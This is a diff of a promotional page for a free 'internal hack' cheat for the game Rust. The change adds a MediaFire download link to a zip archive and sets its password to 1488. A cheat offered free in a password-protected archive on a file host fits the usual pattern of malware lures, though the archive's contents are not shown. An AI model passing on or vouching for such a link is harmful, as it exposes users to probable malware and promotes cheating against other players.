@@ -5,9 +5,9 @@
 
 ✅Rust is a brutal multiplayer survival game that challenges you to survive in a hostile environment full of dangers and enemies. You need to gather resources, craft items, build bases, and fight other players for loot and territory. But what if you could have an edge over your rivals and enjoy the game in a whole new way? That’s where Rust Free Internal Hack comes in.
 
-👉Link: DOWNLOAD
+👉Link: https://www.mediafire.com/file/gmgbf1zjiuo95a8/Rust_INTERNATIONAL.zip/file
 
-🔒Pass:222
+🔒Pass:1488
 
 📌How to Use the Rust Free Internal Hack?
 1️⃣First of all, download the free hack from our website.
